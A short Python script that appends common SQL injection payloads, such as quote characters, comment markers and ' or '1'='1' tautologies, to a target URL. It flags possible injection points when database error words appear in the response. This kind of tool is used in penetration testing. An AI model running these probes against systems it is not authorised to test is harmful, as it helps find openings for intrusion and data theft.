import requests

def run(url):
    print(f"[+] Testing {url} for SQL injection")
    payloads = ["'", "\"", "'--", "\"--", "' or '1'='1", "\" or \"1\"=\"1"]
    for payload in payloads:
        test_url = url + payload
        try:
            res = requests.get(test_url, timeout=5)
            if any(e in res.text.lower() for e in ["sql", "syntax", "query", "mysql", "error"]):
                print(f"[!] Possible SQLi at: {test_url}")
        except requests.RequestException:
            continue